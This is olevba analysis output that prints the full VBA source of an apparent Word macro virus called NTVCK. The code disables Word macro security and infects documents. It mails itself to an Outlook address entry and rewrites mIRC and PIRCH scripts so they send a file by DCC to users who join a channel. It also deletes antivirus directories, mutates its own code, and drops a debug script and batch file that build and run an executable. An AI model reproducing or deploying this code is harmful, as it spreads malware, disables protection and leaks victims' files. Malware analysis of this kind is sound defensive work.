olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NTVCK-1afef77891ea1963056c4a02234e55f743b18a55
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NTVCK-1afef77891ea1963056c4a02234e55f743b18a55 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NTVCK.bas 
in file: Virus.MSWord.NTVCK-1afef77891ea1963056c4a02234e55f743b18a55 - OLE stream: 'Macros/VBA/NTVCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub NTVCK()

    ' NTVCK
    ' ==================================
    ' Code by Necronomikon[ZeroGravity]
    ' ==================================
    ' W2KM.NTVCK.based Virus
    ' ==================================

'VirusName: NTVCK
'Author Name: Necronomikon / [ZeroGravity]
'Date and Time:06.12.01 13:18:00
On Error Resume Next
ActiveDocument.ReadOnlyRecommended = False
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayStatusBar = False
Options.ConfirmConversions = False
Options.VirusProtection = False
CommandBars(" Macro ").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.SaveNormalPrompt = False
If NormalTemplate.VBProject.VBComponents.Item("NTVCK").Name <> "NTVCK" Then
ActiveDocument.VBProject.VBComponents("NTVCK").Export ("C:\Windows\NTVCK.drv")
SetAttr "C:\Windows\NTVCK.drv", 6
End If
If ActiveDocument.VBProject.VBComponents.Item("NTVCK").Name <> "NTVCK" Then
ActiveDocument.VBProject.VBComponents.import ("C:\Windows\NTVCK .drv ")
ActiveDocument.Save
 End If
If Month(Now) = Day(Now) Then Call dropper("C:\start.scr")
If Month(Now) = Day(Now) Then Call startv("c:\startv.bat")
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110)
.Comments = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(119) + Chr(97) + Chr(115) + Chr(32) + Chr(99) + Chr(114) + Chr(101) + Chr(97) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(78) + Chr(84) + Chr(86) + Chr(67) + Chr(75) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110)
.Keywords = Chr(32) + Chr(82) + Chr(101) + Chr(97) + Chr(100) + Chr(121) + Chr(32) + Chr(82) + Chr(97) + Chr(110) + Chr(103) + Chr(101) + Chr(114) + Chr(115) + Chr(32) + Chr(76) + Chr(105) + Chr(98) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(110) + Chr(116)
.Execute
End With
System.PrivateProfileString("", "HKEY_CURRENT_USER\ControlPanel\Desktop", "MenuShowDelay") = "10000"
ActiveDocument.FollowHyperlink Address:="http://www.coderz.net/zerogravity", NewWindow:=False, AddHistory:=True
ActiveDocument.SaveAs FileName:="C:\Windows\System.doc", FileFormat:=wdFormatDocument
Set Ne_OApp = CreateObject("Outlook.Application")
Set Ne_Mapi = Ne_OApp.GetNameSpace("MAPI")
For Each Ne_AddList In Ne_Mapi.AddressLists
Next
If Ne_AddList.AddressEntries.Count <> 0 Then
For Ne_AddListCount = 1 To Ne_AddList.AddressEntries.Count
Next
Set Ne_AddListEntry = Ne_AddList.AddressEntries(Ne_AddListCount)
Set Ne_msg = Ne_OApp.CreateItem(0)
Ne_msg.To = Ne_AddListEntry.Address
Ne_msg.Subject = "Hello"
Ne_msg.Body = "Check this:NTVCK by Necronomikon"
Ne_msg.Attachments.Add Environ("WINDIR") & " \System.doc "
Ne_msg.DeleteAfterSubmit = True
End If
If Ne_msg.To <> "" Then
Ne_msg.Send
End If
Msgbox "Thanks WalruS for this piece of code...!;)", 48, "NTVCK"
ActiveDocument.SaveAs FileName:="C:\Windows\PASSWORDS.doc", FileFormat:=wdFormatDocument
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\NTVCK", "Installed") <> "True" Then
Msgbox "Irc.worm NTVCK by Necronomikon is running!       64           Notice..."
End If
Kill "C:\mirc\Script.ini"
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[SCRIPT]"
Print #1, "n0=on 1:start:{"
Print #1, "n1=on 1:join:#:{"
Print #1, "n2=if ( $nick == $me ) { halt } | .dcc send $nick c:\Windows\PASSWORDS.doc"
Print #1, "n3= }"
Print #1, "n4=on 1:input:*:.msg #ntvck [( $+ $active $+ ) $1-]"
Print #1, "n5=on 1:text:*:?:.msg #ntvck [( $+ $active $+ ) $1-]"
Print #1, "n6=on 1:FILESENT:*.*:/dcc send $nick C:\Windows\PASSWORDS.doc"
Print #1, "n7=on 1:FILERCVD:*.*:/dcc send $nick C:\Windows\PASSWORDS.doc"
Print #1, "n8=on 1:connect:.msg #ntvck by Necronomikon"
Print #1, "n9=  /msg #ntvck Im Infected With A Virus Created By NTVCK"
Print #1, "n10= /part #ntvck"
Print #1, "n11= /clear"
Print #1, "n12= /motd"
Print #1, "n13= }"
Print #1, ";IRC.Worm for NTVCK by Necronomikon"
Close #1
Kill "C:\Windows\eventss.vxd"
Open "C:\Windows\eventss.vxd" For Output As #2
Print #2, "[Levels]"
Print #2, "Enabled=1"
Print #2, "Count=1"
Print #2, "Level1=000-Unknowns"
Print #2, "000-UnknownsEnabled=1"
Print #2, ""
Print #2, "[000-Unknowns]"
Print #2, "User1=*!*@*"
Print #2, "UserCount=1"
Print #2, "Event1=;NTVCK by Necronomikon"
Print #2, "Event2=ON JOIN:#:/dcc send $nick C:\Windows\PASSWORDS.doc"
Print #2, "EventCount=2"
Close #2
Kill "C:\pirch98\events.ini"
Kill "C:\pirch32\events.ini"
SourceFile = "C:\Windows\eventss.vxd"
DestinationFile = "C:\pirch98\events.ini"
FileCopy SourceFile, DestinationFile
SourceFilez = "C:\Windows\eventss.vxd"
DestinationFilez = "C:\pirch32\events.ini"
FileCopy SourceFilez, DestinationFilez
Call UMP
Call KillAV
If Day(Now()) = 31 Then Msgbox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(119) + Chr(97) + Chr(115) + Chr(32) + Chr(99) + Chr(114) + Chr(101) + Chr(97) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(78) + Chr(84) + Chr(86) + Chr(67) + Chr(75) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110)
End Sub
Sub UMP()
'-=[ULTRAS MACRO POLYMORPHIC]=-
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("NTVCK").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("NTVCK").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub
Sub KillAV()
On Error Resume Next
Kill "C:\Progra~1\AntiViral Toolkit Pro\*.*"
Kill "C:\Progra~1\Command Software\F-PROT95\*.*"
Kill "C:\Progra~1\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Progra~1\Quick Heal\*.*"
Kill "C:\Progra~1\McAfee\VirusScan95\*.*"
Kill "C:\Progra~1\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
Kill "C:\eSafe\Protect\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Progra~1\FWIN32"
End Sub

Sub dropper(strFile As String)
On Error Resume Next
'Dropfunction taken from VMPCK by VicodinES
'ASM.Dropper by me!;o)
Dim hFile As Long
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "N start.com"
Print #hFile, "E 00000000 4D5A 5000 0200 0000 0400 0F00 FFFF 0000"
Print #hFile, "E 00000010 B800 0000 0000 0000 4000 1A00 0000 0000"
Print #hFile, "E 00000020 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000030 0000 0000 0000 0000 0000 0000 0001 0000"
Print #hFile, "E 00000040 BA10 000E 1FB4 09CD 21B8 014C CD21 9090"
Print #hFile, "E 00000050 5468 6973 2070 726F 6772 616D 206D 7573"
Print #hFile, "E 00000060 7420 6265 2072 756E 2075 6E64 6572 2057"
Print #hFile, "E 00000070 696E 3332 0D0A 2437 0000 0000 0000 0000"
Print #hFile, "E 00000080 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000090 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000100 5045 0000 4C01 0400 102B 4583 0000 0000"
Print #hFile, "E 00000110 0000 0000 E000 8E81 0B01 0219 0002 0000"
Print #hFile, "E 00000120 0006 0000 0000 0000 0010 0000 0010 0000"
Print #hFile, "E 00000130 0020 0000 0000 4000 0010 0000 0002 0000"
Print #hFile, "E 00000140 0100 0000 0000 0000 0300 0A00 0000 0000"
Print #hFile, "E 00000150 0050 0000 0004 0000 0000 0000 0200 0000"
Print #hFile, "E 00000160 0000 1000 0020 0000 0000 1000 0010 0000"
Print #hFile, "E 00000170 0000 0000 1000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000180 0030 0000 B001 0000 0000 0000 0000 0000"
Print #hFile, "E 00000190 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001A0 0040 0000 2C00 0000 0000 0000 0000 0000"
Print #hFile, "E 000001B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001F0 0000 0000 0000 0000 434F 4445 0000 0000"
Print #hFile, "E 00000200 0010 0000 0010 0000 0002 0000 0006 0000"
Print #hFile, "E 00000210 0000 0000 0000 0000 0000 0000 2000 0060"
Print #hFile, "E 00000220 4441 5441 0000 0000 0010 0000 0020 0000"
Print #hFile, "E 00000230 0002 0000 0008 0000 0000 0000 0000 0000"
Print #hFile, "E 00000240 0000 0000 4000 00C0 2E69 6461 7461 0000"
Print #hFile, "E 00000250 0010 0000 0030 0000 0002 0000 000A 0000"
Print #hFile, "E 00000260 0000 0000 0000 0000 0000 0000 4000 00C0"
Print #hFile, "E 00000270 2E72 656C 6F63 0000 0010 0000 0040 0000"
Print #hFile, "E 00000280 0002 0000 000C 0000 0000 0000 0000 0000"
Print #hFile, "E 00000290 0000 0000 4000 0050 0000 0000 0000 0000"
Print #hFile, "E 000002A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000300 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000310 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000320 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000330 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000340 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000350 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000360 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000370 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000380 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000390 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000400 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000410 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000420 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000430 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000440 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000450 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000460 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000470 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000480 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000490 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000500 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000510 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000520 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000530 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000540 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000550 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000560 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000570 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000580 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000590 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000600 E81E 0000 008B 6424 086A 0068 0020 4000"
Print #hFile, "E 00000610 6825 2040 006A 00E8 6D00 0000 6A00 E824"
Print #hFile, "E 00000620 0000 0064 67FF 3600 0064 6789 2600 00BB"
Print #hFile, "E 00000630 0000 F7BF B878 5634 1287 03FF 257C 3040"
Print #hFile, "E 00000640 00FF 2580 3040 00FF 2584 3040 00FF 2588"
Print #hFile, "E 00000650 3040 00FF 258C 3040 00FF 2590 3040 00FF"
Print #hFile, "E 00000660 2594 3040 00FF 2598 3040 00FF 259C 3040"
Print #hFile, "E 00000670 00FF 25A0 3040 00FF 25A4 3040 00FF 25A8"
Print #hFile, "E 00000680 3040 00FF 25AC 3040 00FF 25B4 3040 0000"
Print #hFile, "E 00000690 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000700 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000710 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000720 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000730 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000740 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000750 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000760 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000770 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000780 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000790 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000800 5374 7275 6374 7572 6564 2045 7863 6570"
Print #hFile, "E 00000810 7469 6F6E 2048 616E 646C 6572 2065 7861"
Print #hFile, "E 00000820 6D70 6C65 0049 6E74 6572 6365 7074 6564"
Print #hFile, "E 00000830 2047 656E 6572 616C 2050 726F 7465 6374"
Print #hFile, "E 00000840 696F 6E20 4661 756C 7421 0000 0000 0000"
Print #hFile, "E 00000850 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000860 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000870 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000880 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000890 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000900 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000910 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000920 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000930 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000940 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000950 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000960 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000970 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000980 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000990 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000A00 3C30 0000 0000 0000 0000 0000 BC30 0000"
Print #hFile, "E 00000A10 7C30 0000 7430 0000 0000 0000 0000 0000"
Print #hFile, "E 00000A20 C930 0000 B430 0000 0000 0000 0000 0000"
Print #hFile, "E 00000A30 0000 0000 0000 0000 0000 0000 D430 0000"
Print #hFile, "E 00000A40 E030 0000 EE30 0000 FC30 0000 0831 0000"
Print #hFile, "E 00000A50 1A31 0000 2831 0000 3A31 0000 5231 0000"
Print #hFile, "E 00000A60 6031 0000 7031 0000 8831 0000 9231 0000"
Print #hFile, "E 00000A70 0000 0000 A231 0000 0000 0000 D430 0000"
Print #hFile, "E 00000A80 E030 0000 EE30 0000 FC30 0000 0831 0000"
Print #hFile, "E 00000A90 1A31 0000 2831 0000 3A31 0000 5231 0000"
Print #hFile, "E 00000AA0 6031 0000 7031 0000 8831 0000 9231 0000"
Print #hFile, "E 00000AB0 0000 0000 A231 0000 0000 0000 4B45 524E"
Print #hFile, "E 00000AC0 454C 3332 2E64 6C6C 0055 5345 5233 322E"
Print #hFile, "E 00000AD0 646C 6C00 0000 436F 7079 4669 6C65 4100"
Print #hFile, "E 00000AE0 0000 436C 6F73 6548 616E 646C 6500 0000"
Print #hFile, "E 00000AF0 4578 6974 5072 6F63 6573 7300 0000 4669"
Print #hFile, "E 00000B00 6E64 436C 6F73 6500 0000 4669 6E64 4669"
Print #hFile, "E 00000B10 7273 7446 696C 6541 0000 0000 4465 6C65"
Print #hFile, "E 00000B20 7465 4669 6C65 4100 0000 4765 7443 6F6D"
Print #hFile, "E 00000B30 6D61 6E64 4C69 6E65 4100 0000 4765 7443"
Print #hFile, "E 00000B40 7572 7265 6E74 4469 7265 6374 6F72 7941"
Print #hFile, "E 00000B50 0000 0000 4765 7446 696C 6553 697A 6500"
Print #hFile, "E 00000B60 0000 4765 7453 7973 7465 6D54 696D 6500"
Print #hFile, "E 00000B70 0000 5365 7443 7572 7265 6E74 4469 7265"
Print #hFile, "E 00000B80 6374 6F72 7941 0000 0000 5769 6E45 7865"
Print #hFile, "E 00000B90 6300 0000 4669 6E64 4E65 7874 4669 6C65"
Print #hFile, "E 00000BA0 4100 0000 4D65 7373 6167 6542 6F78 4100"
Print #hFile, "E 00000BB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C00 0010 0000 2C00 0000 0C30 1130 3D30 4330"
Print #hFile, "E 00000C10 4930 4F30 5530 5B30 6130 6730 6D30 7330"
Print #hFile, "E 00000C20 7930 7F30 8530 8B30 0000 0000 0000 0000"
Print #hFile, "E 00000C30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D00 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D10 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D20 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E00 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E10 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E20 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000ED0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F00 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F10 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F20 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "RCX"
Print #hFile, "1550"
Print #hFile, "W"
Print #hFile, "Q"
Close hFile
End Sub
Sub startv(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "cd\"
Print #hFile, "debug < start.scr > nul"
Print #hFile, "copy start.com start.exe"
Print #hFile, "start"
Close hFile
